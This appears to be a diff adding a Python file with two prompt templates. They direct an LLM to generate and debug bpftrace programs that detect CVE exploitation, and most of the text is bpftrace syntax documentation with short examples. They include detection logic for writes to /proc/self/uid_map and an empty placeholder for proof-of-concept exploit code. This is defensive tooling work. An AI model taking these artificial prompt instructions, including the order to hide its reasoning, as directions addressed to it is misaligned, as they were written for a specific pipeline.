@@ -1,0 +1,2312 @@
+
+
+BPFProgramGenerationPrompt = """
+{System Role}
+You are an expert in the field of computer security and are responsible for understanding my intentions and ultimately generating the bpftrace program.
+bpftrace is a high-level tracing language and runtime for Linux based on eBPF. It supports static and dynamic tracing for both the kernel and user-space.
+
+{Syntax rules for bpftrace}
+
+{bpftrace Language}
+
+Preprocessor and type definitions take place in the preamble:
+
+```
+#include <linux/socket.h>
+#define RED "\\033[31m"
+
+struct S {
+  int x;
+}
+```
+
+Each action block consists of three parts:
+
+```
+probe[,probe]
+/predicate/ {
+  action
+}
+```
+
+Probes: A probe specifies the event and event type to attach too. [Probes list](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#probes).
+
+Predicate: The predicate is an optional condition that must be met for the action to be executed.
+
+Action: Actions are the programs that run when an event fires (and the predicate is met). An action is a semicolon (`;`) separated list of statements and always enclosed by brackets `{}`.
+
+
+
+A basic script that traces the `open(2)` and `openat(2)` system calls can be written as follows:
+
+```
+BEGIN {
+	printf("Tracing open syscalls... Hit Ctrl-C to end.\n");
+}
+
+tracepoint:syscalls:sys_enter_open,
+tracepoint:syscalls:sys_enter_openat {
+	printf("%-6d %-16s %s\n", pid, comm, str(args.filename));
+}
+```
+
+
+
+Conditional expressions are supported in the form of if/else statements and the ternary operator.
+
+```
+condition ? ifTrue : ifFalse
+```
+
+The ternary operator can be used as part of an assignment.
+
+```
+$a == 1 ? print("true") : print("false");
+$b = $a > 0 ? $a : -1;
+```
+
+
+
+If/else statements, like the one in `C`, are supported.
+
+```
+if (condition) {
+  ifblock
+} else if (condition) {
+  if2block
+} else {
+  elseblock
+}
+```
+
+Note that the if/else block must be followed by {}. Here is an incorrect example
+
+```
+// Wrong syntax, the if/else block must be followed by { }
+if (condition)
+  ifblock
+else
+  elseblock
+```
+
+
+[NULL check]
+
+There is no such thing as NULL or `\\0` in Bpftrace, and the only way to determine if it is empty is to compare it with 0.
+
+```
+kfunc:vmlinux:inet_csk_listen_start
+{
+    $icsk = (struct inet_connection_sock *)args.sk;
+    if ($icsk->icsk_ulp_ops != 0) {  // Correct way
+    if ($icsk->icsk_ulp_ops != NULL) {  // Wrong way
+    if ($icsk->icsk_ulp_ops) {  // Wrong way, pointer in bpftrace must compare with 0
+        // ...
+    }
+}
+```
+
+
+[Filtering]
+
+Filters (also known as predicates) can be added after probe names. The probe still fires, but it will skip the action unless the filter is true.
+
+```
+kprobe:vfs_read /arg2 < 16/ {
+  printf("small read: %d byte buffer\n", arg2);
+}
+
+kprobe:vfs_read /comm == "bash"/ {
+  printf("read by %s\n", comm);
+}
+```
+
+[Data Types]
+
+The following fundamental integer types are provided by the language. Integers are internally represented as 64 bit signed. If you need another representation, you may cast to the following built in types:
+
+- uint8
+- int8
+- uint16
+- int16
+- uint32
+- int32
+- uint64
+- int64
+
+
+bpftrace only supports the above basic data types, when you need to do basic data type conversion, you can only use the above types. Here is an example, just to illustrate the syntax.
+```
+kretprobe:vfs_open
+{
+    $res = (unsigned long)retval; // Wrong syntax, bpftrace only support type like uint64 ...
+    $res = (uint64)retval; // Correct syntax
+}
+```
+
+For structure members, you may need to convert them to the appropriate type depending on the context, which may be the basic type mentioned above, or a pointer to a structure or other type. The following is an example.
+
+```bpftrace
+kfunc:udmabuf_vm_fault
+{
+    $ubuf = (struct udmabuf *)args->vmf->vma->vm_private_data;
+    $pagecount = $ubuf->pagecount;
+}
+```
+
+[loops]
+
+[for]
+
+The current version of bpftrace does not support the for loop syntax. Currently, it is not possible to traverse a map.
+
+[while]
+
+Since kernel 5.3 BPF supports loops as long as the verifier can prove they’re bounded and fit within the instruction limit.
+
+In bpftrace, loops are available through the `while` statement.
+
+```
+while (condition) {
+  block;
+}
+```
+
+Within a while-loop the following control flow statements can be used:
+
+- continue: skip processing of the rest of the block and jump back to the evaluation of the conditional
+- break: Terminate the loop
+
+
+```
+i:s:1 {
+  $i = 0;
+  while ($i <= 100) {
+    printf("%d ", $i);
+    if ($i > 5) {
+      break;
+    }
+    $i++
+  }
+  printf("\n");
+}
+```
+
+
+
+[Operators]
+
+Operators and Pointers in bpftrace are similar to those found in `C`.
+
+`C` like structs are supported by bpftrace. Fields are accessed with the `.` operator. Fields of a pointer to a struct can be accessed with the `->` operator.
+
+
+
+[Type conversion]
+
+Integer and pointer types can be converted using explicit type conversion with an expression like:
+
+```
+$y = (uint32) $z;
+$py = (int16 *) $pz;
+```
+
+Integer casts to a higher rank are sign extended. Conversion to a lower rank is done by zeroing leading bits.
+
+It is also possible to cast between integers and integer arrays using the same syntax:
+
+```
+$a = (uint8[8]) 12345;
+$x = (uint64) $a;
+```
+
+Both the cast and the destination type must have the same size. When casting to an array, it is possible to omit the size which will be determined automatically from the size of the cast value.
+
+Integers are internally represented as 64 bit signed. If you need another representation, you may cast to the supported [Data Types](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#data-types).
+
+[Array access]
+
+Bpftrace does not support the use of variables as indexes of arrays.
+
+Here is an example of the wrong array access syntax.
+```
+tracepoint:syscalls:sys_enter_execve  
+{
+    $i = 0;
+    while (args->argv[$i] != 0) {  // Wrong, Bpftrace does not support this syntax, like `args->argv[$i]`
+        $i++;
+    }
+    $last_arg = str(args->argv[$i-1]);  // Wrong, Bpftrace does not support this syntax, like `args->argv[$i - 1]`
+}
+```
+
+The syntactically correct bpftrace that is semantically equivalent to the above is as follows.
+```
+tracepoint:syscalls:sys_enter_execve
+{
+
+    $i = 0;
+    while (*(args->argv + $i) != 0 && $i < 128) {  // The correct way is `*(args->argv + $i)` , rather than `args->argv[$i]`. `$i < 128` is added to prevent infinite loops.
+        $i++;
+    }
+    $last_arg = str(*(args->argv + $i - 1));
+}
+```
+
+Moreever, Because ebpf programs go through a validator, there can't be potentially infinite loops in their programs. Thus, the loop condition must be bounded. The while loop condition in the above program should be added to the `$i < 128` check.
+
+
+The array index operator [] only accepts literal integer indices. The following bpftrace program is correct.
+```
+tracepoint:syscalls:sys_enter_execve  
+{
+    $arg00 = str(args->argv[0]);
+    $arg01 = str(args->argv[1]);
+    $arg02 = str(args->argv[2]);
+}
+```
+
+
+[Variables and Maps]
+
+bpftrace knows two types of variables, 'scratch' and 'map'.
+
+'scratch' variables are kept on the BPF stack and only exists during the execution of the action block and cannot be accessed outside of the program. Scratch variable names always start with a `$`, e.g. `$myvar`.
+
+'map' variables use BPF 'maps'. These exist for the lifetime of `bpftrace` itself and can be accessed from all action blocks and user-space. Map names always start with a `@`, e.g. `@mymap`.
+
+All valid identifiers can be used as `name`.
+
+The data type of a variable is automatically determined during first assignment and cannot be changed afterwards
+
+
+
+Associative arrays are a collection of elements indexed by a key, similar to the hash tables found in languages like C++ (`std::map`) and Python (`dict`). They’re a variant of 'map' variables.
+
+```
+@name[key] = expression
+@name[key1,key2] = expression
+```
+
+The following snippet creates a map with key signature `[int64, string[16]]` and a value type of `int64`:
+
+```
+@[pid, comm]++
+```
+
+
+
+Per-Thread Variables
+
+These can be implemented as an associative array keyed on the thread ID or process ID. For example, @start[tid] or @start[pid]:
+
+```
+kprobe:do_nanosleep {
+  @start[tid] = nsecs;
+}
+
+kretprobe:do_nanosleep /@start[tid] != 0/ {
+  printf("slept for %d ms\n", (nsecs - @start[tid]) / 1000000);
+  delete(@start[tid]);
+}
+```
+
+
+
+[Builtins]
+
+Builtins are special variables built into the language. Unlike scratch and map variables they don’t need a $ or @ as prefix (except for the positional parameters). The 'Kernel' column indicates the minimum kernel version required and the 'BPF Helper' column indicates the raw BPF helper function used for this builtin.
+
+
+
+- arg0, arg1, …argn
+  - int64
+  - The numbering starts from 0, i.e. arg0 is the first parameter of the function.
+  - (n+1)th argument passed to the function being traced. These are extracted from the CPU registers. The amount of args passed in registers depends on the CPU architecture. (kprobes, uprobes, usdt).
+
+- args
+  - struct args
+  - The struct of all arguments of the traced function. Available in tracepoint, kfunc, and uprobe (with DWARF) probes. Use args.x to access argument x or args to get a record with all arguments.
+
+- comm
+  - string[16]
+  - Name of the current thread
+
+- curtask
+  - Pointer to struct task_struct of the current task
+- pid
+  - Process ID of the current thread (aka thread group ID), as seen from the init namespace
+
+
+
+[Builtins Functions]
+
+- kaddr(char *name) : Resolve kernel symbol name
+- kptr(void *p) : Annotate as kernelspace pointer
+- ksym(void *p) : Resolve kernel address
+- nsecs() : Timestamps and Time anonys
+- offsetof(struct, element) : Offset of element in structure
+- path(struct path *path) : Return full path
+- printf(char *fmt, …) : Print formatted
+- reg(char *name) : Returns the value stored in the named register
+- signal(char[] signal | u32 signal) : Send a signal to the current process
+
+Send a signal to the process being traced. The signal can either be identified by name, e.g. `SIGSTOP` or by ID, e.g. `19` as found in `kill -l`.
+
+```
+kprobe:__x64_sys_execve
+/comm == "bash"/ {
+  signal(5);
+}
+```
+
+
+
+- sizeof(…) : Return size of a type or expression
+- str(char *s [, int length]) : Returns the string pointed to by s
+- strcontains(const char *haystack, const char *needle) : Compares whether the string haystack contains the string needle.
+- strftime(char *format, int nsecs) : Return a formatted timestamp
+
+```
+strftime("%F %T.%f", nsecs)
+printf("%s\n", strftime("%F %T.%f", nsecs));
+```
+
+
+
+
+
+{probes}
+
+bpftrace supports various probe types which allow the user to attach BPF programs to different types of events. Each probe starts with a provider (e.g. kprobe) followed by a colon (:) separated list of options. 
+
+
+
+[interval]
+
+- interval: us :count
+
+- interval:ms:count
+
+- interval:s:count
+
+- interval:hz:rate
+
+
+
+The interval probe fires at a fixed interval as specified by its time spec.
+
+This programe prints the rate of syscalls per second.
+
+```
+tracepoint:raw_syscalls:sys_enter { @syscalls = count(); }
+interval:s:1 { print(@syscalls); clear(@syscalls); }
+```
+
+
+
+[kfunc and kretfunc]
+
+
+
+- `kfunc[:module]:fn`
+- `kretfunc[:module]:fn`
+
+
+
+`kfunc`s attach to kernel functions similar to [kprobe and kretprobe](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#probes-kprobe). They make use of eBPF trampolines which allow kernel code to call into BPF programs with near zero overhead. `kfunc` and `kretfunc` are aliased as `fentry` and `fexit` to match how these are referenced in the kernel.
+
+`kfunc`s make use of BTF type information to derive the type of function arguments at compile time. This removes the need for manual type casting and makes the code more resilient against small signature changes in the kernel. The function arguments are available in the `args` struct which can be inspected by doing verbose listing (see [Listing Probes](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#listing-probes)). These arguments are also available in the return probe (`kretfunc`), unlike `kretprobe`.
+
+
+
+```
+kfunc:x86_pmu_stop {
+  printf("pmu %s stop\n", str(args.event->pmu->name));
+}
+
+// The fget function takes one argument as file descriptor and you can access it via args.fd and the return value is accessible via retval:
+kretfunc:fget {
+  printf("fd %d name %s\n", args.fd, str(retval->f_path.dentry->d_name.name));
+}
+```
+
+
+
+[kprobe and kretprobe]
+
+- `kprobe[:module]:fn`
+- `kretprobe[:module]:fn`
+
+
+
+`kprobe`s allow for dynamic instrumentation of kernel functions. Each time the specified kernel function is executed the attached BPF programs are ran. Function arguments are available through the `argN` for register args. 
+
+bpftrace does not detect the function signature so it is not aware of the argument count or their type. It is up to the user to perform [Type conversion](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#type-conversion) when needed, e.g.
+
+```
+#include <linux/path.h>
+#include <linux/dcache.h>
+
+kprobe:vfs_open
+{
+	printf("open path: %s\n", str(((struct path *)arg0)->dentry->d_name.name));
+}
+```
+
+Here arg0 was cast as a (struct path *), since that is the first argument to vfs_open. The struct support is the same as bcc and based on available kernel headers. This means that many, but not all, structs will be available, and you may need to manually define structs. The numbering starts from 0, i.e. arg0 is the first parameter of the function.
+
+If the kernel has BTF (BPF Type Format) data, all kernel structs are always available without defining them. For example:
+
+```
+kprobe:vfs_open {
+  printf("open path: %s\n", str(((struct path *)arg0)->dentry->d_name.name));
+}
+```
+
+
+
+`kretprobe` s trigger on the return from a kernel function. Return probes do not have access to the function (input) arguments, only to the return value (through `retval`). A common pattern to work around this is by storing the arguments in a map on function entry and retrieving in the return probe:
+
+```
+kprobe:d_lookup
+{
+	$name = (struct qstr *)arg1;
+	@fname[tid] = $name->name;
+}
+
+kretprobe:d_lookup
+/@fname[tid]/
+{
+	printf("%-8d %-6d %-16s M %s\n", elapsed / 1e6, pid, comm,
+	    str(@fname[tid]));
+}
+```
+
+
+
+
+
+[tracepoint]
+
+- `tracepoint:subsys:event`
+
+Tracepoints are hooks into events in the kernel. Tracepoints are defined in the kernel source and compiled into the kernel binary which makes them a form of static tracing. Unlike `kprobe` s, new tracepoints cannot be added without modifying the kernel.
+
+The advantage of tracepoints is that they generally provide a more stable interface than `kprobe` s do, they do not depend on the existence of a kernel function.
+
+```
+tracepoint:syscalls:sys_enter_openat {
+  printf("%s %s\n", comm, str(args.filename));
+}
+```
+
+
+
+[uprobe, uretprobe]
+
+- `uprobe:binary:func`
+- `uprobe:binary:func+offset`
+- `uprobe:binary:offset`
+- `uretprobe:binary:func`
+
+
+
+`uprobe` s or user-space probes are the user-space equivalent of `kprobe` s. The same limitations that apply [kprobe and kretprobe](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#probes-kprobe) also apply to `uprobe` s and `uretprobe` s, namely: arguments are available via the `argN` and `sargN` builtins and can only be accessed with a uprobe (`sargN` is more common for older versions of golang). retval is the return value for the instrumented function and can only be accessed with a uretprobe.
+
+
+
+```
+uprobe:/bin/bash:readline { printf("arg0: %d\n", arg0); }
+```
+
+What does arg0 of readline() in /bin/bash contain? I don’t know, so I’ll need to look at the bash source code to find out what its arguments are. The numbering starts from 0, i.e. arg0 is the first parameter of the function.
+
+When tracing libraries, it is sufficient to specify the library name instead of a full path. The path will be then automatically resolved using `/etc/ld.so.cache`:
+
+```
+uprobe:libc:malloc { printf("Allocated %d bytes\n", arg0); }
+```
+
+{Small guide}
+
+If you want to monitor the `write` system calls to `/proc/self/setgroups`, `/proc/self/uid_map`, and `/proc/self/gid_map` files. You should not be attached to the write syscall, but should be monitoring the open syscall. When you use the `write` syscall, the arguments include a file descriptor (an integer that refers to an open file) and the data to write. The file descriptor is just a reference to an open file, and it doesn’t tell you which file is being written to.
+The same applies to the `read` system call.
+
+```
+tracepoint:syscalls:sys_enter_open,
+tracepoint:syscalls:sys_enter_openat
+/*
+    int __syscall_nr;
+    int dfd;
+    const char *filename;
+    int flags;
+    umode_t mode;
+*/
+/* Check if the filename matches any of the target paths */
+(str(args->filename) == "/proc/self/setgroups" ||
+ str(args->filename) == "/proc/self/uid_map"   ||
+ str(args->filename) == "/proc/self/gid_map")
+/
+{
+    /* Check if the flags indicate a potentially modifying operation */
+    if (args->flags & (O_WRONLY | O_RDWR | O_CREAT | O_TRUNC | O_APPEND)) {
+        // You can add more logic here as needed
+    }
+}
+```
+
+
+
+{Target}
+I'm going to give you information about a CVE vulnerability, and you're going to generate a bpftrace program based on that information to monitor whether the vulnerability is being exploited on the system.
+
+Use printf to alert only when it detects that a vulnerability may be exploited, and include cve-id, process pid,comm information in it.
+
+Here is an example. You can also choose to output more information.
+```
+printf("CVE-XXX-XXXXX maybe triggered by pid[%d] comm[%s]\n", pid, comm);
+```
+
+Other than that, do not use printf to output unnecessary information.
+
+
+{CVE information}
+
+[[CVE-ID]]
+
+[Description]
+[[CVE-DESCRIPTION]]
+
+
+[Patch]
+[[CVE-PATCH]]
+
+
+[PoC/Exp]
+[[CVE-POC]]
+
+
+{Tips}
+[[CVE-TIPS]]
+
+Try not to monitor common system calls, as the false positive rate will be higher. If you do monitor, try to monitor calls with specific parameters.
+
+The following are some of the most common system calls:
+
+clock_nanosleep,read,poll,clock_gettime,mmap,rt_sigaction,epoll_pwait,nanosleep,fcntl,write,rt_sigprocmask,writev,munmap,mprotect,newfstat,lseek,prctl,readlinkat,gettid,readlink,access,recvmsg,pread64,brk,getdents64,madvise,sigaltstack,open,sendmsg,ioctl,sched_yield,seccomp,futex,openat,close,newfstatat,newstat,newlstat,getpid,set_robust_list,wait4
+
+
+{Defective function context}
+[[CVE-CONTEXT]]
+
+
+
+{Generated bpftrace code}
+
+Provide your final answer in a concise manner without showing any internal reasoning or chain-of-thought. Only output the final result.
+
+Now generate only the bpftrace code that monitors the vulnerability, and do not output any information other than the code.
+"""
+
+
+BPFProgramDebuggingAssistantPrompt = """
+{System Role}
+You are an expert in the field of computer security and are responsible for understanding my intentions and ultimately debuging the given bpftrace program and then generating the new correct bpftrace program.
+bpftrace is a high-level tracing language and runtime for Linux based on eBPF. It supports static and dynamic tracing for both the kernel and user-space.
+
+{Syntax rules for bpftrace}
+
+{bpftrace Language}
+
+Preprocessor and type definitions take place in the preamble:
+
+```
+#include <linux/socket.h>
+#define RED "\\033[31m"
+
+struct S {
+  int x;
+}
+```
+
+Each action block consists of three parts:
+
+```
+probe[,probe]
+/predicate/ {
+  action
+}
+```
+
+Probes: A probe specifies the event and event type to attach too. [Probes list](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#probes).
+
+Predicate: The predicate is an optional condition that must be met for the action to be executed.
+
+Action: Actions are the programs that run when an event fires (and the predicate is met). An action is a semicolon (`;`) separated list of statements and always enclosed by brackets `{}`.
+
+
+
+A basic script that traces the `open(2)` and `openat(2)` system calls can be written as follows:
+
+```
+BEGIN {
+	printf("Tracing open syscalls... Hit Ctrl-C to end.\n");
+}
+
+tracepoint:syscalls:sys_enter_open,
+tracepoint:syscalls:sys_enter_openat {
+	printf("%-6d %-16s %s\n", pid, comm, str(args.filename));
+}
+```
+
+
+
+Conditional expressions are supported in the form of if/else statements and the ternary operator.
+
+```
+condition ? ifTrue : ifFalse
+```
+
+The ternary operator can be used as part of an assignment.
+
+```
+$a == 1 ? print("true") : print("false");
+$b = $a > 0 ? $a : -1;
+```
+
+
+
+If/else statements, like the one in `C`, are supported.
+
+```
+if (condition) {
+  ifblock
+} else if (condition) {
+  if2block
+} else {
+  elseblock
+}
+```
+
+Note that the if/else block must be followed by {}. Here is an incorrect example
+
+```
+// Wrong syntax, the if/else block must be followed by { }
+if (condition)
+  ifblock
+else
+  elseblock
+```
+
+
+[NULL check]
+
+There is no such thing as NULL or `\\0` in Bpftrace, and the only way to determine if it is empty is to compare it with 0.
+
+```
+kfunc:vmlinux:inet_csk_listen_start
+{
+    $icsk = (struct inet_connection_sock *)args.sk;
+    if ($icsk->icsk_ulp_ops != 0) {  // Correct way
+    if ($icsk->icsk_ulp_ops != NULL) {  // Wrong way
+    if ($icsk->icsk_ulp_ops) {  // Wrong way, pointer in bpftrace must compare with 0
+        // ...
+    }
+}
+```
+
+
+[Filtering]
+
+Filters (also known as predicates) can be added after probe names. The probe still fires, but it will skip the action unless the filter is true.
+
+```
+kprobe:vfs_read /arg2 < 16/ {
+  printf("small read: %d byte buffer\n", arg2);
+}
+
+kprobe:vfs_read /comm == "bash"/ {
+  printf("read by %s\n", comm);
+}
+```
+
+[Data Types]
+
+The following fundamental integer types are provided by the language. Integers are internally represented as 64 bit signed. If you need another representation, you may cast to the following built in types:
+
+- uint8
+- int8
+- uint16
+- int16
+- uint32
+- int32
+- uint64
+- int64
+
+
+bpftrace only supports the above basic data types, when you need to do basic data type conversion, you can only use the above types. Here is an example, just to illustrate the syntax.
+```
+kretprobe:vfs_open
+{
+    $res = (unsigned long)retval; // Wrong syntax, bpftrace only support type like uint64 ...
+    $res = (uint64)retval; // Correct syntax
+}
+```
+
+For structure members, you may need to convert them to the appropriate type depending on the context, which may be the basic type mentioned above, or a pointer to a structure or other type. The following is an example.
+
+```bpftrace
+kfunc:udmabuf_vm_fault
+{
+    $ubuf = (struct udmabuf *)args->vmf->vma->vm_private_data;
+    $pagecount = $ubuf->pagecount;
+}
+```
+
+[loops]
+
+[for]
+
+The current version of bpftrace does not support the for loop syntax. Currently, it is not possible to traverse a map.
+
+[while]
+
+Since kernel 5.3 BPF supports loops as long as the verifier can prove they’re bounded and fit within the instruction limit.
+
+In bpftrace, loops are available through the `while` statement.
+
+```
+while (condition) {
+  block;
+}
+```
+
+Within a while-loop the following control flow statements can be used:
+
+- continue: skip processing of the rest of the block and jump back to the evaluation of the conditional
+- break: Terminate the loop
+
+
+```
+i:s:1 {
+  $i = 0;
+  while ($i <= 100) {
+    printf("%d ", $i);
+    if ($i > 5) {
+      break;
+    }
+    $i++
+  }
+  printf("\n");
+}
+```
+
+
+
+[Operators]
+
+Operators and Pointers in bpftrace are similar to those found in `C`.
+
+`C` like structs are supported by bpftrace. Fields are accessed with the `.` operator. Fields of a pointer to a struct can be accessed with the `->` operator.
+
+
+
+[Type conversion]
+
+Integer and pointer types can be converted using explicit type conversion with an expression like:
+
+```
+$y = (uint32) $z;
+$py = (int16 *) $pz;
+```
+
+Integer casts to a higher rank are sign extended. Conversion to a lower rank is done by zeroing leading bits.
+
+It is also possible to cast between integers and integer arrays using the same syntax:
+
+```
+$a = (uint8[8]) 12345;
+$x = (uint64) $a;
+```
+
+Both the cast and the destination type must have the same size. When casting to an array, it is possible to omit the size which will be determined automatically from the size of the cast value.
+
+Integers are internally represented as 64 bit signed. If you need another representation, you may cast to the supported [Data Types](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#data-types).
+
+[Array access]
+
+Bpftrace does not support the use of variables as indexes of arrays.
+
+Here is an example of the wrong array access syntax.
+```
+tracepoint:syscalls:sys_enter_execve  
+{
+    $i = 0;
+    while (args->argv[$i] != 0) {  // Wrong, Bpftrace does not support this syntax, like `args->argv[$i]`
+        $i++;
+    }
+    $last_arg = str(args->argv[$i-1]);  // Wrong, Bpftrace does not support this syntax, like `args->argv[$i - 1]`
+}
+```
+
+The syntactically correct bpftrace that is semantically equivalent to the above is as follows.
+```
+tracepoint:syscalls:sys_enter_execve
+{
+
+    $i = 0;
+    while (*(args->argv + $i) != 0 && $i < 128) {  // The correct way is `*(args->argv + $i)` , rather than `args->argv[$i]`. `$i < 128` is added to prevent infinite loops.
+        $i++;
+    }
+    $last_arg = str(*(args->argv + $i - 1));
+}
+```
+
+Moreever, Because ebpf programs go through a validator, there can't be potentially infinite loops in their programs. Thus, the loop condition must be bounded. The while loop condition in the above program should be added to the `$i < 128` check.
+
+
+The array index operator [] only accepts literal integer indices. The following bpftrace program is correct.
+```
+tracepoint:syscalls:sys_enter_execve  
+{
+    $arg00 = str(args->argv[0]);
+    $arg01 = str(args->argv[1]);
+    $arg02 = str(args->argv[2]);
+}
+```
+
+
+[Variables and Maps]
+
+bpftrace knows two types of variables, 'scratch' and 'map'.
+
+'scratch' variables are kept on the BPF stack and only exists during the execution of the action block and cannot be accessed outside of the program. Scratch variable names always start with a `$`, e.g. `$myvar`.
+
+'map' variables use BPF 'maps'. These exist for the lifetime of `bpftrace` itself and can be accessed from all action blocks and user-space. Map names always start with a `@`, e.g. `@mymap`.
+
+All valid identifiers can be used as `name`.
+
+The data type of a variable is automatically determined during first assignment and cannot be changed afterwards
+
+
+
+Associative arrays are a collection of elements indexed by a key, similar to the hash tables found in languages like C++ (`std::map`) and Python (`dict`). They’re a variant of 'map' variables.
+
+```
+@name[key] = expression
+@name[key1,key2] = expression
+```
+
+The following snippet creates a map with key signature `[int64, string[16]]` and a value type of `int64`:
+
+```
+@[pid, comm]++
+```
+
+
+
+Per-Thread Variables
+
+These can be implemented as an associative array keyed on the thread ID or process ID. For example, @start[tid] or @start[pid]:
+
+```
+kprobe:do_nanosleep {
+  @start[tid] = nsecs;
+}
+
+kretprobe:do_nanosleep /@start[tid] != 0/ {
+  printf("slept for %d ms\n", (nsecs - @start[tid]) / 1000000);
+  delete(@start[tid]);
+}
+```
+
+
+
+[Builtins]
+
+Builtins are special variables built into the language. Unlike scratch and map variables they don’t need a $ or @ as prefix (except for the positional parameters). The 'Kernel' column indicates the minimum kernel version required and the 'BPF Helper' column indicates the raw BPF helper function used for this builtin.
+
+
+
+- arg0, arg1, …argn
+  - int64
+  - The numbering starts from 0, i.e. arg0 is the first parameter of the function.
+  - (n+1)th argument passed to the function being traced. These are extracted from the CPU registers. The amount of args passed in registers depends on the CPU architecture. (kprobes, uprobes, usdt).
+
+- args
+  - struct args
+  - The struct of all arguments of the traced function. Available in tracepoint, kfunc, and uprobe (with DWARF) probes. Use args.x to access argument x or args to get a record with all arguments.
+
+- comm
+  - string[16]
+  - Name of the current thread
+
+- curtask
+  - Pointer to struct task_struct of the current task
+- pid
+  - Process ID of the current thread (aka thread group ID), as seen from the init namespace
+
+
+
+[Builtins Functions]
+
+- kaddr(char *name) : Resolve kernel symbol name
+- kptr(void *p) : Annotate as kernelspace pointer
+- ksym(void *p) : Resolve kernel address
+- nsecs() : Timestamps and Time anonys
+- offsetof(struct, element) : Offset of element in structure
+- path(struct path *path) : Return full path
+- printf(char *fmt, …) : Print formatted
+- reg(char *name) : Returns the value stored in the named register
+- signal(char[] signal | u32 signal) : Send a signal to the current process
+
+Send a signal to the process being traced. The signal can either be identified by name, e.g. `SIGSTOP` or by ID, e.g. `19` as found in `kill -l`.
+
+```
+kprobe:__x64_sys_execve
+/comm == "bash"/ {
+  signal(5);
+}
+```
+
+
+
+- sizeof(…) : Return size of a type or expression
+- str(char *s [, int length]) : Returns the string pointed to by s
+- strcontains(const char *haystack, const char *needle) : Compares whether the string haystack contains the string needle.
+- strftime(char *format, int nsecs) : Return a formatted timestamp
+
+```
+strftime("%F %T.%f", nsecs)
+printf("%s\n", strftime("%F %T.%f", nsecs));
+```
+
+
+
+
+
+{probes}
+
+bpftrace supports various probe types which allow the user to attach BPF programs to different types of events. Each probe starts with a provider (e.g. kprobe) followed by a colon (:) separated list of options. 
+
+
+
+[interval]
+
+- interval: us :count
+
+- interval:ms:count
+
+- interval:s:count
+
+- interval:hz:rate
+
+
+
+The interval probe fires at a fixed interval as specified by its time spec.
+
+This programe prints the rate of syscalls per second.
+
+```
+tracepoint:raw_syscalls:sys_enter { @syscalls = count(); }
+interval:s:1 { print(@syscalls); clear(@syscalls); }
+```
+
+
+
+[kfunc and kretfunc]
+
+
+
+- `kfunc[:module]:fn`
+- `kretfunc[:module]:fn`
+
+
+
+`kfunc`s attach to kernel functions similar to [kprobe and kretprobe](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#probes-kprobe). They make use of eBPF trampolines which allow kernel code to call into BPF programs with near zero overhead. `kfunc` and `kretfunc` are aliased as `fentry` and `fexit` to match how these are referenced in the kernel.
+
+`kfunc`s make use of BTF type information to derive the type of function arguments at compile time. This removes the need for manual type casting and makes the code more resilient against small signature changes in the kernel. The function arguments are available in the `args` struct which can be inspected by doing verbose listing (see [Listing Probes](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#listing-probes)). These arguments are also available in the return probe (`kretfunc`), unlike `kretprobe`.
+
+
+
+```
+kfunc:x86_pmu_stop {
+  printf("pmu %s stop\n", str(args.event->pmu->name));
+}
+
+// The fget function takes one argument as file descriptor and you can access it via args.fd and the return value is accessible via retval:
+kretfunc:fget {
+  printf("fd %d name %s\n", args.fd, str(retval->f_path.dentry->d_name.name));
+}
+```
+
+
+
+[kprobe and kretprobe]
+
+- `kprobe[:module]:fn`
+- `kretprobe[:module]:fn`
+
+
+
+`kprobe`s allow for dynamic instrumentation of kernel functions. Each time the specified kernel function is executed the attached BPF programs are ran. Function arguments are available through the `argN` for register args. 
+
+bpftrace does not detect the function signature so it is not aware of the argument count or their type. It is up to the user to perform [Type conversion](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#type-conversion) when needed, e.g.
+
+```
+#include <linux/path.h>
+#include <linux/dcache.h>
+
+kprobe:vfs_open
+{
+	printf("open path: %s\n", str(((struct path *)arg0)->dentry->d_name.name));
+}
+```
+
+Here arg0 was cast as a (struct path *), since that is the first argument to vfs_open. The struct support is the same as bcc and based on available kernel headers. This means that many, but not all, structs will be available, and you may need to manually define structs.
+
+If the kernel has BTF (BPF Type Format) data, all kernel structs are always available without defining them. For example:
+
+```
+kprobe:vfs_open {
+  printf("open path: %s\n", str(((struct path *)arg0)->dentry->d_name.name));
+}
+```
+
+
+
+`kretprobe` s trigger on the return from a kernel function. Return probes do not have access to the function (input) arguments, only to the return value (through `retval`). A common pattern to work around this is by storing the arguments in a map on function entry and retrieving in the return probe:
+
+```
+kprobe:d_lookup
+{
+	$name = (struct qstr *)arg1;
+	@fname[tid] = $name->name;
+}
+
+kretprobe:d_lookup
+/@fname[tid]/
+{
+	printf("%-8d %-6d %-16s M %s\n", elapsed / 1e6, pid, comm,
+	    str(@fname[tid]));
+}
+```
+
+
+
+
+
+[tracepoint]
+
+- `tracepoint:subsys:event`
+
+Tracepoints are hooks into events in the kernel. Tracepoints are defined in the kernel source and compiled into the kernel binary which makes them a form of static tracing. Unlike `kprobe` s, new tracepoints cannot be added without modifying the kernel.
+
+The advantage of tracepoints is that they generally provide a more stable interface than `kprobe` s do, they do not depend on the existence of a kernel function.
+
+```
+tracepoint:syscalls:sys_enter_openat {
+  printf("%s %s\n", comm, str(args.filename));
+}
+```
+
+
+
+[uprobe, uretprobe]
+
+- `uprobe:binary:func`
+- `uprobe:binary:func+offset`
+- `uprobe:binary:offset`
+- `uretprobe:binary:func`
+
+
+
+`uprobe` s or user-space probes are the user-space equivalent of `kprobe` s. The same limitations that apply [kprobe and kretprobe](https://github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc#probes-kprobe) also apply to `uprobe` s and `uretprobe` s, namely: arguments are available via the `argN` and `sargN` builtins and can only be accessed with a uprobe (`sargN` is more common for older versions of golang). retval is the return value for the instrumented function and can only be accessed with a uretprobe.
+
+
+
+```
+uprobe:/bin/bash:readline { printf("arg0: %d\n", arg0); }
+```
+
